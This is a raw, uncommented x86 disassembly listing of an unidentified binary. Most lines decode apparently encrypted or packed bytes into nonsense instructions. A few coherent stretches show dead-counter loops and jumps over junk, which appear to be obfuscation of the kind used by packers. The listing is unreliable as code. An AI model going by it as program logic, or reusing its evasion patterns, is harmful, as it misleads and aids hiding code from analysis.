  4073b1:	inc    ebp
  4073b2:	push   ecx
  4073b3:	lahf   
  4073b4:	leave  
  4073b5:	(bad)  
  4073b6:	or     al,0x37
  4073b8:	retf   0x3056
  4073bb:	fs das 
  4073bd:	jmp    0xf5c5:0xcc3f2008
  4073c4:	arpl   WORD PTR [ebx-0x59],di
  4073c7:	leave  
  4073c8:	test   esp,eax
  4073ca:	jb     0x407398
  4073cc:	mov    dh,0xd9
  4073ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073cf:	lds    ecx,FWORD PTR [ebp+0x545d9966]
  4073d5:	inc    esi
  4073d6:	int3   
  4073d7:	out    dx,eax
  4073d8:	add    dh,dh
  4073da:	pop    esp
  4073db:	loopne 0x407395
  4073dd:	mov    ecx,0xd3e92cbf
  4073e2:	test   DWORD PTR [ebp-0x7d],0xe7729ee7
  4073e9:	mov    dh,0x30
  4073eb:	data16 (bad) 
  4073ed:	je     0x407411
  4073ef:	jle    0x4073a2
  4073f1:	mov    ds:0x1058070,eax
  4073f6:	xchg   DWORD PTR [edi],edx
  4073f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073f9:	lods   eax,DWORD PTR ds:[esi]
  4073fa:	sbb    DWORD PTR [esi-0x677d7bea],ebx
  407400:	cmp    al,0x5d
  407402:	xor    BYTE PTR [ebp-0x124f3faa],dl
  407408:	sbb    eax,0x86e76e9
  40740d:	add    eax,DWORD PTR [esi-0x134a873e]
  407413:	push   ebx
  407414:	mov    esp,0xae00e162
  407419:	and    DWORD PTR ds:0xca84158,esi
  40741f:	dec    eax
  407420:	push   0x6a
  407422:	fild   DWORD PTR [eax+0x14]
  407425:	int3   
  407426:	jle    0x40744f
  407428:	in     al,0x65
  40742a:	sbb    al,0x90
  40742c:	pusha  
  40742d:	lahf   
  40742e:	xchg   esi,eax
  40742f:	stos   BYTE PTR es:[edi],al
  407430:	cmp    eax,0xb5ea0a5
  407436:	out    0xf1,eax
  407438:	xor    BYTE PTR [eax+eax*1+0x3bea8858],dh
  40743f:	xor    eax,0x90e625e1
  407444:	lahf   
  407445:	popa   
  407446:	jmp    0xbd08bf0a
  40744b:	xor    BYTE PTR [ecx-0x401815e8],cl
  407451:	ja     0x40743b
  407453:	fucom  st(3)
  407455:	mov    al,ds:0xa6ec5176
  40745a:	xor    esi,DWORD PTR [ebp+ebp*8-0x5a14bf26]
  407461:	push   ecx
  407462:	cmp    al,0xf7
  407464:	mov    eax,ds:0xf3489a06
  407469:	stc    
  40746a:	jl     0x407427
  40746c:	cmp    al,0xfd
  40746e:	out    dx,eax
  40746f:	ds pushf 
  407471:	push   esi
  407472:	mov    bl,0xd9
  407474:	mov    WORD PTR [edi],cs
  407476:	mov    dh,0x65
  407478:	and    ah,BYTE PTR [edx+0xba0f2e5]
  40747e:	scas   al,BYTE PTR es:[edi]
  40747f:	repnz push esi
  407481:	test   BYTE PTR [edx+ebp*1],0xdf
  407485:	out    dx,eax
  407486:	imul   esp,ebx,0x60
  407489:	(bad)
  40748c:	mov    ecx,0x55e38195
  407491:	xchg   ecx,eax
  407492:	push   0xffffffbf
  407494:	aam    0x2
  407496:	pop    ebp
  407497:	sbb    BYTE PTR [edx+0x763f3719],al
  40749d:	sbb    DWORD PTR [ebx],ebx
  40749f:	mov    al,BYTE PTR [esp+edi*4]
  4074a2:	(bad)  
  4074a3:	retf   
  4074a4:	xor    esp,DWORD PTR [ebx+0x26c862fc]
  4074aa:	mov    edi,0x60033774
  4074af:	mov    ecx,0xe5729808
  4074b4:	(bad)  
  4074b5:	ja     0x407505
  4074b7:	stos   BYTE PTR es:[edi],al
  4074b8:	call   0x681f46c2
  4074bd:	seto   BYTE PTR [edx]
  4074c0:	lea    ebp,[ebx-0x1cbc5d29]
  4074c6:	jmp    0x40745a
  4074c8:	rol    BYTE PTR [ebx-0x25],cl
  4074cb:	mov    ecx,0x866e33b3
  4074d0:	dec    ecx
  4074d1:	jnp    0x40747a
  4074d3:	mov    edi,0x967e8cb3
  4074d8:	mov    dh,0x13
  4074da:	mov    ebx,0xe99ddc68
  4074df:	push   ds
  4074e0:	add    al,0xe8
  4074e2:	pusha  
  4074e3:	mov    eax,0xfe74884f
  4074e8:	and    BYTE PTR [esi+edx*2-0x76],cl
  4074ec:	push   ecx
  4074ed:	push   cs
  4074ee:	adc    al,0xa8
  4074f0:	iret   
  4074f1:	jmp    0x40751a
  4074f3:	stos   DWORD PTR es:[edi],eax
  4074f4:	adc    ebp,DWORD PTR [esi]
  4074f6:	xchg   BYTE PTR [ecx+0x2afe0ce3],ah
  4074fc:	add    ah,BYTE PTR [ebp+0x12]
  4074ff:	xor    al,0x65
  407501:	xchg   ebp,eax
  407502:	aas    
  407503:	and    cl,BYTE PTR [ebp+0x12]
  407506:	inc    edx
  407507:	shl    ebp,0x1f
  40750a:	retf   
  40750b:	int3   
  40750c:	out    dx,al
  40750d:	fistp  QWORD PTR [ecx+esi*8]
  407510:	nop
  407511:	les    esi,FWORD PTR [edi+eiz*1]
  407514:	ins    DWORD PTR es:[edi],dx
  407515:	mov    dh,BYTE PTR [edx-0x4a]
  407518:	adc    dl,BYTE PTR [esi+0x57601c4b]
  40751e:	xchg   edi,eax
  40751f:	mov    ecx,0x9601813d
  407524:	popa   
  407525:	(bad)  
  407526:	jno    0x4075a6
  407528:	adc    BYTE PTR [ebx+esi*8],cl
  40752b:	das    
  40752c:	lods   eax,DWORD PTR ds:[esi]
  40752d:	jo     0x407517
  40752f:	mov    BYTE PTR ds:0x8975bd64,ah
  407535:	push   ecx
  407536:	loopne 0x40756d
  407538:	test   BYTE PTR [eax+0x5e],dh
  40753b:	dec    edx
  40753c:	jl     0x4074cb
  40753e:	ins    DWORD PTR es:[edi],dx
  40753f:	ss mov eax,0xa32afe6e
  407545:	aaa    
  407546:	loope  0x407587
  407548:	out    0x3e,eax
  40754a:	sti    
  40754b:	into   
  40754c:	mov    al,ds:0x9d13779a
  407551:	outs   dx,DWORD PTR ds:[esi]
  407552:	mov    DWORD PTR [ecx-0x48],ecx
  407555:	iret   
  407556:	out    0x4e,eax
  407558:	lahf   
  407559:	inc    DWORD PTR [edx]
  40755b:	sub    bl,BYTE PTR [ecx]
  40755d:	mov    WORD PTR [ebx-0x4c1e981e],?
  407563:	inc    esp
  407564:	add    al,0x7a
  407566:	jne    0x407554
  407568:	fisub  WORD PTR [esi+0x563f0360]
  40756e:	add    eax,DWORD PTR [edi-0x32]
  407571:	aam    0xab
  407573:	int    0xf9
  407575:	cld    
  407576:	pop    esi
  407577:	push   0x8443db1e
  40757c:	xchg   edx,eax
  40757d:	or     ch,BYTE PTR [ecx+ebx*4+0x48]
  407581:	in     al,dx
  407582:	js     0x4075b8
  407584:	sbb    DWORD PTR ds:0x13ff3e07,ebx
  40758a:	adc    al,0xb5
  40758c:	out    0xbc,eax
  40758e:	cmp    BYTE PTR [esi-0x3c],al
  407591:	jle    0x407515
  407593:	stc    
  407594:	inc    edi
  407595:	jo     0x4075b3
  407597:	gs retf 
  407599:	out    dx,al
  40759a:	rcl    ah,1
  40759c:	pop    edx
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x4336d3
  4075b4:	sub    DWORD PTR ds:0x43368f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43367f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4336eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43368f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43368f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43368f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43368f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43368f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	loopne 0x4076b9
  407657:	add    al,ah
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0xd07e7e7c
  407662:	pusha  
  407663:	enter  0x5a70,0xf
  407667:	mov    ecx,0x11acd7ac
  40766c:	dec    ebx
  40766d:	mov    ch,0x6d
  40766f:	xor    al,0x40
  407671:	test   eax,0x20e5ef6b
  407676:	std    
  407677:	retf   0x60d9
  40767a:	push   0xf0a7c5a4
  40767f:	(bad)  
  407680:	dec    ebx
  407681:	sbb    BYTE PTR [ebx],bh
  407683:	push   0x19
  407685:	mov    bl,0xbe
  407687:	cli    
  407688:	xchg   esi,eax
  407689:	pop    ecx
  40768a:	repnz into 
  40768c:	repnz xor dl,bh
  40768f:	inc    esi
  407690:	shl    BYTE PTR [ecx+0x7f5e8e68],1
  407696:	popf   
  407697:	vmread DWORD PTR ds:0x85c1714a,eax
  40769e:	and    al,0xd3
  4076a0:	inc    edi
  4076a1:	cwde   
  4076a2:	pop    edx
  4076a3:	dec    esi
  4076a4:	bound  ecx,QWORD PTR [eax]
  4076a6:	js     0x4076c1
  4076a8:	loop   0x40763d
  4076aa:	pop    ss
  4076ab:	stc    
  4076ac:	icebp  
  4076ad:	mov    esp,0x99143624
  4076b2:	jmp    0xf3c0f52f
  4076b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b8:	pop    ecx
  4076b9:	push   ds
  4076ba:	pop    eax
  4076bb:	retf   0xcc28
  4076be:	iret   
  4076bf:	into   
  4076c0:	dec    edx
  4076c1:	or     edx,edi
  4076c3:	jg     0x40770e
  4076c5:	inc    di
  4076c7:	inc    eax
  4076c8:	jne    0x407741
  4076ca:	das    
  4076cb:	and    bh,BYTE PTR ds:0x5ffd8520
  4076d1:	sti    
  4076d2:	shl    BYTE PTR [esi+0x29],0x6
  4076d6:	and    bh,cl
  4076d8:	push   cs
  4076d9:	mov    esi,0x45e6b2b8
  4076de:	push   ss
  4076df:	or     eax,0x2e9e940e
  4076e4:	stos   DWORD PTR es:[edi],eax
  4076e5:	outs   dx,BYTE PTR ds:[esi]
  4076e6:	jno    0x407712
  4076e8:	push   edi
  4076e9:	lea    edi,[ecx-0x1d]
  4076ec:	icebp  
  4076ed:	dec    ecx
  4076ee:	mov    ch,BYTE PTR [edi+0x63]
  4076f1:	xchg   BYTE PTR [esp+ecx*1-0x4d47fdfd],al
  4076f8:	imul   eax,DWORD PTR [edi+edx*1+0x64],0xffffffde
  4076fd:	dec    esi
  4076fe:	call   0xa8dd:0x88b09005
  407705:	outs   dx,BYTE PTR ds:[esi]
  407706:	lds    esi,FWORD PTR [ecx+0x4b]
  407709:	test   edi,ebp
  40770b:	fs inc ebx
  40770d:	jns    0x40772f
  40770f:	and    DWORD PTR [eax],esp
  407711:	sub    bh,BYTE PTR [esi-0x75]
  407714:	xrelease mov DWORD PTR [ebp-0x5],eax
  407718:	mov    BYTE PTR [edx+ecx*4+0x4d],dl
  40771c:	pop    esp
  40771d:	cli    
  40771e:	scas   al,BYTE PTR es:[edi]
  40771f:	clc    
  407720:	out    dx,eax
  407721:	lods   al,BYTE PTR ds:[esi]
  407722:	in     al,0x84
  407724:	inc    esi
  407725:	call   0xdf722293
  40772a:	stos   BYTE PTR es:[edi],al
  40772b:	mov    al,0xae
  40772d:	mov    ds:0x60710654,eax
  407732:	out    dx,al
  407733:	jl     0x40779a
  407735:	je     0x4077af
  407737:	fst    DWORD PTR [eax+0x63c64e7f]
  40773d:	daa    
  40773e:	cdq    
  40773f:	mov    ecx,0x898593e1
  407744:	ins    BYTE PTR es:[edi],dx
  407745:	lea    esp,gs:[edx]
  407748:	(bad)  
  40774a:	fst    DWORD PTR [edi+0x1]
  40774d:	(bad)  
  40774e:	mov    ecx,0x5595d8e0
  407753:	xlat   BYTE PTR ds:[ebx]
  407754:	cmp    DWORD PTR [ebx-0x31475c53],eax
  40775a:	adc    DWORD PTR [ebp+0x7439d136],edi
  407760:	fcmovnbe st,st(1)
  407762:	sbb    al,0xd0
  407764:	xchg   DWORD PTR [eax+0x2c23bb9e],edx
  40776a:	into   
  40776b:	inc    esi
  40776c:	aam    0xfe
  40776e:	fwait
  40776f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407770:	fwait
  407771:	and    ecx,DWORD PTR [ebx]
  407773:	aaa    
  407774:	lahf   
  407775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407776:	xchg   ecx,eax
  407777:	xor    BYTE PTR [edx],bh
  407779:	add    edi,0x4f2d2774
  40777f:	outs   dx,BYTE PTR ds:[esi]
  407780:	mov    eax,0x4296ab5b
  407785:	scas   eax,DWORD PTR es:[edi]
  407786:	enter  0x67fe,0xaf
  40778a:	stc    
  40778b:	call   0xd922:0xaa52bf74
  407792:	cmp    eax,0xd8e02ffa
  407797:	das    
  407798:	int    0x80
  40779a:	inc    BYTE PTR [eax+0x6]
  40779d:	sbb    ebx,esp
  40779f:	hlt    
  4077a0:	arpl   bp,sp
  4077a2:	jg     0x4077af
  4077a4:	ins    BYTE PTR es:[edi],dx
  4077a5:	(bad)  
  4077a6:	leave  
  4077a7:	test   ebx,ebx
  4077a9:	fidivr DWORD PTR [eax]
  4077ab:	in     eax,dx
  4077ac:	(bad)  
  4077ae:	or     al,0x38
  4077b0:	test   BYTE PTR [eax+esi*4+0x4e],ch
  4077b4:	mov    dl,0xa3
  4077b6:	sti    
  4077b7:	and    al,0x77
  4077b9:	pop    ecx
  4077ba:	enter  0xabf2,0x38
  4077be:	xor    ecx,DWORD PTR [ebx+0x38]
  4077c1:	or     ebp,DWORD PTR [ebx]
  4077c3:	call   0x2e3c6e54
  4077c8:	mov    dh,0xff
  4077ca:	lds    eax,FWORD PTR [esi-0x57]
  4077cd:	rol    DWORD PTR [eax+0x5c],0xfe
  4077d1:	icebp  
  4077d2:	or     dh,bl
  4077d4:	fsub   QWORD PTR ds:0x8a24eb8a
  4077da:	cmp    eax,0x52e58455
  4077df:	retf   0x501e
  4077e2:	ret    0x7fda
  4077e5:	fisubr WORD PTR [ebp+0x26]
  4077e8:	mov    al,ds:0x40c22fa0
  4077ed:	in     eax,0x24
  4077ef:	fcmovnb st,st(2)
  4077f1:	ror    BYTE PTR [edi],0x49
  4077f4:	xchg   ebx,eax
  4077f5:	dec    eax
  4077f6:	es jae 0x4077e3
  4077f9:	pop    edx
  4077fa:	push   esi
  4077fb:	stos   BYTE PTR es:[edi],al
  4077fc:	ds ret 
  4077fe:	imul   ecx,DWORD PTR [edi],0x29
  407801:	in     al,0xad
  407803:	mov    dl,0x69
  407805:	or     esi,0xf9a6802d
  40780b:	sbb    al,0x9b
  40780d:	ins    DWORD PTR es:[edi],dx
  40780e:	push   edx
  40780f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407810:	adc    DWORD PTR [ecx-0x61a737a],edi
  407816:	or     BYTE PTR [ebx-0x50a21cd6],bh
  40781c:	fld    TBYTE PTR [ecx+0x7b60fad6]
  407822:	sbb    BYTE PTR ds:0xec0bde52,dl
  407828:	pop    esi
  407829:	popa   
  40782a:	push   edi
  40782b:	cmc    
  40782c:	xor    DWORD PTR [ebx+ebx*8-0x6f010aff],ebx
  407833:	test   DWORD PTR [ecx-0x5bf63c8d],esp
  407839:	xor    ch,dl
  40783b:	and    al,0xbb
  40783d:	psubsw mm0,QWORD PTR [esi]
  407840:	lea    ebp,[ebx]
  407842:	addr16 mov bh,dl
  407845:	sbb    edi,DWORD PTR [ecx+0x19]
  407848:	push   esp
  407849:	lea    edx,[edx+0xa988044]
  40784f:	cwde   
  407850:	or     ah,BYTE PTR [esi+0xd14562a]
  407856:	imul   ecx,DWORD PTR [ebx+0x61],0x1c76a1cb
  40785d:	stc    
  40785e:	jl     0x4077eb
  407860:	out    0x98,al
  407862:	mov    ah,0x2f
  407864:	rol    DWORD PTR [esi-0x586a4109],1
  40786a:	mov    edi,0xce2b56be
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43367f,0x4336e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43379b,0x12
  40788b:	cmp    DWORD PTR ds:0x43379b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43379b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43379b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43379b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43371f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43371f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43371f,esi
  4078e0:	cmp    DWORD PTR ds:0x43371f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43371f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xe3,eax
  407922:	retf   
  407923:	mov    ebx,DWORD PTR [esp-0x32]
  407927:	jle    0x4079a7
  407929:	add    eax,0xe7e7e7c
  40792e:	cmp    DWORD PTR ds:0x72ddf04d,esp
  407934:	dec    edx
  407935:	sti    
  407936:	sbb    ch,al
  407938:	sub    ah,dl
  40793a:	jne    0x4078de
  40793c:	and    al,0x86
  40793e:	div    DWORD PTR [edi]
  407940:	int    0x43
  407942:	push   0x427b86a
  407947:	retf   
  407948:	imul   ebp,DWORD PTR [ebx],0x70
  40794b:	pop    edx
  40794c:	cli    
  40794d:	test   al,0x53
  40794f:	stos   BYTE PTR es:[edi],al
  407950:	jns    0x407938
  407952:	sbb    al,0x30
  407954:	ret    
  407955:	mov    cl,0x8a
  407957:	xchg   ebp,eax
  407958:	mov    dl,0xbc
  40795a:	fsub   DWORD PTR [esi+0x37]
  40795d:	scas   al,BYTE PTR es:[edi]
  40795e:	dec    eax
  40795f:	inc    edi
  407960:	out    0xd9,eax
  407962:	pop    es
  407963:	mov    dl,0x61
  407965:	and    al,0xbf
  407967:	sbb    al,0x1
  407969:	jle    0x40795a
  40796b:	or     eax,0x300ad31b
  407970:	ins    DWORD PTR es:[edi],dx
  407971:	add    eax,0x485c645d
  407976:	lods   al,BYTE PTR ds:[esi]
  407977:	pop    ss
  407978:	test   BYTE PTR [edi],cl
  40797a:	dec    ebp
  40797b:	mov    ?,WORD PTR [ecx+0x2b]
  40797e:	xor    al,0xc9
  407981:	popf   
  407982:	mul    ecx
  407984:	fild   QWORD PTR [esi-0x75]
  407987:	fcom   DWORD PTR [edi+0x6f407c24]
  40798d:	fiadd  DWORD PTR [eax]
  40798f:	imul   ecx,DWORD PTR [ecx+0x18],0xffffffcf
  407993:	sahf   
  407994:	jnp    0x4079ca
  407996:	pop    ss
  407997:	cmp    ecx,DWORD PTR [ecx-0x5c16545e]
  40799d:	outs   dx,BYTE PTR ds:[esi]
  40799e:	adc    eax,DWORD PTR [ebx]
  4079a0:	sub    eax,0x27d618cd
  4079a5:	lods   eax,DWORD PTR ds:[esi]
  4079a6:	jbe    0x4079fb
  4079a8:	pop    esp
  4079a9:	(bad)  
  4079aa:	sbb    al,0x7b
  4079ac:	sti    
  4079ad:	or     al,0x65
  4079af:	(bad)  
  4079b1:	xchg   ecx,eax
  4079b2:	xor    DWORD PTR [esi],esp
  4079b4:	adc    eax,0xabe43f9e
  4079b9:	ret    
  4079ba:	fs dec edx
  4079bc:	popf   
  4079bd:	and    ecx,DWORD PTR [eax]
  4079bf:	mov    eax,0x7cce0671
  4079c4:	jl     0x40798a
  4079c6:	jno    0x407a30
  4079c8:	jne    0x407980
  4079ca:	inc    esp
  4079cb:	cmp    al,0x52
  4079cd:	and    eax,0xc83581ce
  4079d2:	adc    al,0x82
  4079d4:	test   DWORD PTR [ecx-0x68],ebx
  4079d7:	mov    ebp,0x72d5c7d4
  4079dc:	inc    edx
  4079dd:	ret    
  4079de:	out    dx,eax
  4079df:	mov    ch,0x26
  4079e1:	xor    eax,0x20cc589f
  4079e6:	js     0x407968
  4079e8:	pop    edi
  4079e9:	test   DWORD PTR gs:[edi],eax
  4079ec:	outs   dx,BYTE PTR ds:[esi]
  4079ed:	into   
  4079ee:	cmp    BYTE PTR [ecx+eiz*8],bh
  4079f1:	ret    0x8b27
  4079f4:	nop
  4079f5:	push   esi
  4079f6:	test   BYTE PTR [ebx+0x6bd1abc],al
  4079fc:	cli    
  4079fd:	push   edi
  4079fe:	push   ebx
  4079ff:	ret    0x172c
  407a02:	jmp    0xb28c:0x774bc754
  407a09:	stc    
  407a0a:	mov    dh,0x74
  407a0c:	lds    edx,FWORD PTR cs:[edx+esi*1]
  407a10:	and    eax,DWORD PTR [ecx-0x4be6d86b]
  407a16:	aam    0x6
  407a18:	or     DWORD PTR [eax+0x4f],edx
  407a1b:	ins    BYTE PTR es:[edi],dx
  407a1c:	retf   0xc027
  407a1f:	mov    esi,0x95fbbaa2
  407a24:	cmp    eax,0x7af32133
  407a29:	arpl   WORD PTR [eax+0x48],ax
  407a2c:	leave  
  407a2d:	(bad)  
  407a2e:	cmp    al,0xc0
  407a30:	outs   dx,DWORD PTR ds:[esi]
  407a31:	jl     0x407a71
  407a33:	jae    0x4079c0
  407a35:	sub    BYTE PTR [eax],dl
  407a37:	pop    esi
  407a38:	mov    ds:0x6835cad4,eax
  407a3d:	xor    al,0xae
  407a3f:	les    esp,FWORD PTR [esi+0xd7c6351]
  407a45:	or     bh,cl
  407a47:	and    BYTE PTR [esi+0x2c],al
  407a4a:	and    BYTE PTR [esi*2-0x7536bba],ch
  407a51:	jns    0x407aa3
  407a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a54:	xchg   esp,eax
  407a55:	xchg   esi,eax
  407a56:	leave  
  407a57:	jno    0x407a71
  407a59:	xor    al,0x2c
  407a5b:	mov    ds:0xd5a52c3d,al
  407a60:	clc    
  407a61:	mov    BYTE PTR [edx],ah
  407a63:	es retf 0xf311
  407a67:	mov    eax,ds:0xa3c19d4c
  407a6c:	out    0x60,eax
  407a6e:	lahf   
  407a6f:	mov    dl,0xae
  407a71:	mov    al,0xac
  407a73:	push   ecx
  407a74:	js     0xbee9469
  407a7a:	je     0x407ad7
  407a7c:	add    esp,DWORD PTR [esi]
  407a7e:	mov    eax,ds:0x5f8f941
  407a83:	push   ds
  407a84:	xchg   ebp,eax
  407a85:	arpl   dx,bx
  407a87:	sbb    DWORD PTR [ebp+0xe],ecx
  407a8a:	jp     0x407a95
  407a8c:	inc    eax
  407a8d:	jae    0x407ac7
  407a8f:	sub    DWORD PTR [edi],ecx
  407a91:	retf   
  407a92:	fsubr  st,st(7)
  407a94:	or     ebx,DWORD PTR [edi]
  407a96:	hlt    
  407a97:	adc    esp,0xea872b6a
  407a9d:	add    bl,dh
  407a9f:	leave  
  407aa0:	mov    al,ds:0xf1959af0
  407aa5:	in     al,dx
  407aa6:	clc    
  407aa7:	sahf   
  407aa8:	jl     0x407a4b
  407aaa:	inc    ecx
  407aab:	aaa    
  407aac:	push   eax
  407aad:	mov    DWORD PTR [edi+edx*2-0x2de0e64a],esi
  407ab4:	int3   
  407ab5:	loop   0x407ae9
  407ab7:	or     al,0xbb
  407ab9:	or     al,0xc0
  407abb:	fadd   DWORD PTR [ebx+eax*4+0x26]
  407abf:	jl     0x407a8b
  407ac1:	jmp    0x356e:0x869cbdd3
  407ac8:	mov    ds:0x93c7aa77,al
  407acd:	in     al,dx
  407ace:	pop    edx
  407acf:	xchg   ebx,eax
  407ad0:	add    al,0x67
  407ad2:	cld    
  407ad3:	xchg   edi,eax
  407ad4:	xchg   edx,eax
  407ad5:	adc    al,0x10
  407ad7:	or     al,0xda
  407ad9:	pop    esp
  407ada:	lods   eax,DWORD PTR ds:[esi]
  407adb:	sub    al,0x6a
  407add:	pop    edx
  407ade:	or     eax,0xea3afab7
  407ae3:	icebp  
  407ae4:	(bad)  [eax+0x4cd52a80]
  407aea:	push   ebp
  407aeb:	jb     0x407ad2
  407aed:	push   ebp
  407aee:	inc    ebx
  407aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af0:	mov    ecx,0xd39925c
  407af5:	add    al,0x96
  407af7:	sbb    ch,ch
  407af9:	and    ch,ah
  407afb:	adc    DWORD PTR [ebp+0x6ee1987a],esp
  407b01:	sub    bh,dl
  407b03:	xor    BYTE PTR [edi+0x67b561d],bh
  407b09:	aaa    
  407b0a:	jno    0x407ab0
  407b0c:	je     0x407ab1
  407b0e:	loope  0x407b5c
  407b10:	sub    eax,0x36e64646
  407b15:	adc    DWORD PTR [edx-0x4a],ebx
  407b18:	rcr    ecx,0x92
  407b1b:	push   esi
  407b1c:	cmp    dl,BYTE PTR [ecx-0x73]
  407b1f:	inc    esp
  407b20:	adc    al,0xd2
  407b22:	and    BYTE PTR [esi+eiz*8+0x6b],0xb4
  407b27:	rcl    DWORD PTR [esi+esi*4-0x437df517],1
  407b2e:	mov    BYTE PTR [ebx],cl
  407b30:	out    0x44,eax
  407b32:	jmp    0x43f65f0a
  407b37:	inc    esp
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43372b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4336d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433687,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4337af,0x43368f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43371f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433683
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433727,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43369f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4336eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4336eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433757
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4336d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4336d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4336d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4336d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4336d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4336d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4336d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4336d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	cmp    ch,BYTE PTR [eax-0x33d4d482]
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x2d7e7e7c
  407c57:	sbb    BYTE PTR [eax+0x7d],dl
  407c5a:	lahf   
  407c5b:	jl     0x407cc7
  407c5d:	dec    ebp
  407c5e:	adc    esi,esi
  407c60:	imul   eax,DWORD PTR [ecx],0x21f7da71
  407c66:	push   es
  407c67:	les    esi,FWORD PTR [eax+0x33975855]
  407c6d:	loop   0x407c7b
  407c6f:	arpl   WORD PTR [edx-0x477cb0fd],dx
  407c75:	adc    dh,cl
  407c77:	mov    esi,0x8664d3f
  407c7c:	sbb    eax,0x5127c800
